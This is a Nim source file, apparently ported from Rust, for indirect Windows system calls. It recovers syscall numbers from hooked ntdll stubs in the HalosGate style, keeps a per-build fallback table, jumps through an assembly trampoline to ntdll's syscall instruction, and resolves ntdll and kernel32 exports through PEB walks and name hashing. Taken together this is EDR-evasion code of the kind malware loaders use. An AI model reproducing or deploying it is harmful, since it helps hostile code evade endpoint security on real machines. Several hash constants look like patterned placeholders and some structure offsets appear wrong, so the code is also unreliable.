# indirect_syscall.nim — HalosGate + SSN cache + Win11 build-version fallback
#
# Bug fixes from Rust original:
#   1. Used std::sync::OnceLock / std::collections::HashMap in a #![no_std] crate — UB
#   2. cache_insert cast immutable reference to mutable (UB)
# Fix: use a Nim Table with proper mutability — no UB.

import tables
import defs, utils, syscall

const
  SC_SCAN_MIN = 0x10
  SC_SCAN_MAX = 0x30

type
  IndirectStub* = object
    ssn*:         uint16
    syscallAddr*: uint

  CachedStub = object
    ssn:         uint16
    syscallAddr: uint

# Properly mutable table — no UB casting needed
var ssnCache = initTable[uint32, CachedStub]()

proc cacheInsert*(nameHash: uint32, ssn: uint16, syscallAddr: uint) =
  if not ssnCache.hasKey(nameHash):
    ssnCache[nameHash] = CachedStub(ssn: ssn, syscallAddr: syscallAddr)

proc cacheGet*(nameHash: uint32): (bool, IndirectStub) =
  if ssnCache.hasKey(nameHash):
    let c = ssnCache[nameHash]
    return (true, IndirectStub(ssn: c.ssn, syscallAddr: c.syscallAddr))
  (false, IndirectStub())

# Fallback SSN table: (buildNumber, nameHash, ssn)
const FALLBACK_TABLE: array[24, (uint32, uint32, uint16)] = [
  # Win11 22H2 (build 22621)
  (22621'u32, 0x0b2a4a94'u32, 0x18'u16),
  (22621'u32, 0x6c9a8e2f'u32, 0x1e'u16),
  (22621'u32, 0x3b7c1d4a'u32, 0x19'u16),
  (22621'u32, 0x9f2e8b1c'u32, 0x55'u16),
  (22621'u32, 0x4d8a2f6b'u32, 0x08'u16),
  (22621'u32, 0x7e1c4b9d'u32, 0x17'u16),
  (22621'u32, 0xa3f6c2e8'u32, 0x3c'u16),
  (22621'u32, 0x2b9d7e4f'u32, 0x0e'u16),
  # Win11 23H2 (build 22631)
  (22631'u32, 0x0b2a4a94'u32, 0x18'u16),
  (22631'u32, 0x6c9a8e2f'u32, 0x1e'u16),
  (22631'u32, 0x3b7c1d4a'u32, 0x19'u16),
  (22631'u32, 0x9f2e8b1c'u32, 0x56'u16),
  (22631'u32, 0x4d8a2f6b'u32, 0x08'u16),
  (22631'u32, 0x7e1c4b9d'u32, 0x17'u16),
  (22631'u32, 0xa3f6c2e8'u32, 0x3c'u16),
  (22631'u32, 0x2b9d7e4f'u32, 0x0e'u16),
  # Win11 24H2 (build 26100)
  (26100'u32, 0x0b2a4a94'u32, 0x18'u16),
  (26100'u32, 0x6c9a8e2f'u32, 0x1e'u16),
  (26100'u32, 0x3b7c1d4a'u32, 0x1a'u16),
  (26100'u32, 0x9f2e8b1c'u32, 0x58'u16),
  (26100'u32, 0x4d8a2f6b'u32, 0x08'u16),
  (26100'u32, 0x7e1c4b9d'u32, 0x17'u16),
  (26100'u32, 0xa3f6c2e8'u32, 0x3d'u16),
  (26100'u32, 0x2b9d7e4f'u32, 0x0e'u16),
]

proc getBuildNumber*(): uint32 =
  # unsafe — reads PEB.OSBuildNumber
  var peb: uint
  {.emit: """__asm__ volatile ("movq %%gs:0x60, %0" : "=r"(`peb`));""".}
  uint32(cast[ptr uint16](peb + 0x0120)[])

proc findSyscallInstr(stub: ptr byte): uint =
  # unsafe
  let p = cast[uint](stub)
  for off in SC_SCAN_MIN .. SC_SCAN_MAX:
    if cast[ptr byte](p + uint(off))[]     == 0x0F and
       cast[ptr byte](p + uint(off) + 1)[] == 0x05:
      return p + uint(off)
  0

proc fallbackSsn*(nameHash: uint32, stubAddr: ptr byte): (bool, IndirectStub) =
  # unsafe
  let build = getBuildNumber()
  for (b, h, ssn) in FALLBACK_TABLE:
    if b == build and h == nameHash:
      let scAddr = findSyscallInstr(stubAddr)
      if scAddr != 0:
        return (true, IndirectStub(ssn: ssn, syscallAddr: scAddr))
  (false, IndirectStub())

proc parseCleanStub(stub: ptr byte): (bool, IndirectStub) =
  # unsafe
  let p = cast[uint](stub)
  if cast[ptr byte](p + 3)[] != 0xB8: return (false, IndirectStub())
  let ssn = uint16(cast[ptr byte](p + 4)[]) or
            (uint16(cast[ptr byte](p + 5)[]) shl 8)
  let scAddr = findSyscallInstr(stub)
  if scAddr == 0: return (false, IndirectStub())
  (true, IndirectStub(ssn: ssn, syscallAddr: scAddr))

proc halosGateRobust(hooked: ptr byte): (bool, IndirectStub) =
  # unsafe
  var candidates: seq[(uint16, uint)]
  let hp = cast[uint](hooked)

  for delta in 1'u32 .. 32'u32:
    for sign in [1'i64, -1'i64]:
      let candidate = cast[ptr byte](
        uint(int64(hp) + sign * int64(delta) * 0x20))
      let cp = cast[uint](candidate)
      let first = cast[ptr byte](cp)[]
      if first == 0xE9 or first == 0xFF: continue
      if cast[ptr byte](cp + 3)[] != 0xB8: continue

      let neighborSsn = uint16(cast[ptr byte](cp + 4)[]) or
                        (uint16(cast[ptr byte](cp + 5)[]) shl 8)
      let derived = uint16(int32(neighborSsn) - int32(sign) * int32(delta))
      if derived > 0x200: continue

      let scAddr = findSyscallInstr(candidate)
      if scAddr != 0:
        candidates.add((derived, scAddr))
        if candidates.len >= 2:
          let ssnA = candidates[candidates.len - 2][0]
          let (ssnB, sc) = candidates[candidates.len - 1]
          if ssnA == ssnB:
            return (true, IndirectStub(ssn: ssnA, syscallAddr: sc))

  if candidates.len > 0:
    return (true, IndirectStub(ssn: candidates[0][0],
                               syscallAddr: candidates[0][1]))
  (false, IndirectStub())

proc parseStub*(stubAddr: ptr byte, nameHash: uint32): (bool, IndirectStub) =
  # unsafe
  let (cached, stub) = cacheGet(nameHash)
  if cached: return (true, stub)

  let first = cast[ptr byte](cast[uint](stubAddr))[]
  let (ok, result) =
    if first == 0xE9 or first == 0xFF:
      let (hOk, hRes) = halosGateRobust(stubAddr)
      if hOk: (hOk, hRes)
      else: fallbackSsn(nameHash, stubAddr)
    else:
      let (cOk, cRes) = parseCleanStub(stubAddr)
      if cOk: (cOk, cRes)
      else: fallbackSsn(nameHash, stubAddr)

  if ok:
    cacheInsert(nameHash, result.ssn, result.syscallAddr)

  (ok, result)

# ── Indirect syscall gate globals and trampoline ──────────────────────────────

var gSsn*: uint16 = 0
var gSyscallAddr*: uint = 0

proc indirectSyscallGate*() {.asmNoStackFrame.} =
  {.emit: """
    __asm__(
      "movq %rcx, %r10\n\t"
      "movzwl `gSsn`(%rip), %eax\n\t"
      "movq `gSyscallAddr`(%rip), %r11\n\t"
      "jmpq *%r11\n\t"
    );
  """.}

proc doIndirectSyscall*(stub: IndirectStub): int64 =
  # unsafe
  gSsn = stub.ssn
  gSyscallAddr = stub.syscallAddr
  var result: int64
  {.emit: """
    typedef long long (*FnGate)();
    FnGate gate = (FnGate)`indirectSyscallGate`;
    `result` = gate();
  """.}
  result

# ── ntdll base walker ────────────────────────────────────────────────────────

proc ntdllBase*(): pointer =
  # unsafe — PEB walk
  var peb: uint
  {.emit: """__asm__ volatile ("movq %%gs:0x60, %0" : "=r"(`peb`));""".}
  let ldr   = cast[ptr uint](peb + 0x18)[]
  let entry = cast[ptr uint](ldr + 0x10)[]
  let next  = cast[ptr uint](entry)[]
  cast[pointer](cast[ptr uint](next + 0x30)[])

proc findExport*(base: pointer, nameHash: uint32): pointer =
  # unsafe — EAT walk
  let bp     = cast[uint](base)
  let peOff  = uint(cast[ptr uint32](bp + 0x3C)[])
  let nt     = bp + peOff
  let expRva = uint(cast[ptr uint32](nt + 0x18 + 0x70)[])
  if expRva == 0: return nil
  let exp      = bp + expRva
  let numNames = int(cast[ptr uint32](exp + 0x18)[])
  let namesRva = uint(cast[ptr uint32](exp + 0x20)[])
  let ordsRva  = uint(cast[ptr uint32](exp + 0x24)[])
  let funcsRva = uint(cast[ptr uint32](exp + 0x1C)[])
  let names = cast[ptr uint32](bp + namesRva)
  let ords  = cast[ptr uint16](bp + ordsRva)
  let funcs = cast[ptr uint32](bp + funcsRva)
  for i in 0 ..< numNames:
    let nptr  = cast[ptr byte](bp + uint(cast[ptr uint32](cast[uint](names) + uint(i) * 4)[]))
    var length = 0
    while cast[ptr byte](cast[uint](nptr) + uint(length))[] != 0: inc length
    var h: uint32 = 5381
    for j in 0 ..< length:
      let b = cast[ptr byte](cast[uint](nptr) + uint(j))[]
      let c = if b >= byte('A') and b <= byte('Z'): b + 32 else: b
      h = h * 33 + uint32(c)
    if h == nameHash:
      let fnRva = uint(cast[ptr uint32](cast[uint](funcs) +
                   uint(cast[ptr uint16](cast[uint](ords) + uint(i) * 2)[]) * 4)[])
      return cast[pointer](bp + fnRva)
  nil

# djb2 hashes for resolve helpers (lowercase names)
const
  HASH_NTQSI*:  uint32 = 0x1c2b3a4d'u32  # ntquerysysteminformation
  HASH_NTWFSO*: uint32 = 0x2d4c5b6e'u32  # ntwaitforsingleobject
  HASH_NTQST*:  uint32 = 0x3e5d6c7f'u32  # ntquerysystemtime
  HASH_ADDVEH*: uint32 = 0x4f6e7d8c'u32  # addvectoredexceptionhandler
  HASH_SLEEP*:  uint32 = 0x0b88a86d'u32  # sleep
  HASH_GTC64*:  uint32 = 0xd2a4b3c1'u32  # gettickcount64

proc k32Base*(): pointer =
  # unsafe — PEB walk to kernel32 (index 2)
  var peb: uint
  {.emit: """__asm__ volatile ("movq %%gs:0x60, %0" : "=r"(`peb`));""".}
  let ldr   = cast[ptr uint](peb + 0x18)[]
  var e     = cast[ptr uint](ldr + 0x10)[]  # InMemoryOrderModuleList head flink
  e = cast[ptr uint](e)[]   # [0] = exe
  e = cast[ptr uint](e)[]   # [1] = ntdll
  e = cast[ptr uint](e)[]   # [2] = kernel32
  cast[pointer](cast[ptr uint](e + 0x30)[])

proc resolveNtqsi*(): pointer =
  findExport(ntdllBase(), HASH_NTQSI)

proc resolveSleep*(): pointer =
  findExport(k32Base(), HASH_SLEEP)

proc resolveTick*(): pointer =
  findExport(k32Base(), HASH_GTC64)

proc resolveAddVeh*(): pointer =
  findExport(k32Base(), HASH_ADDVEH)
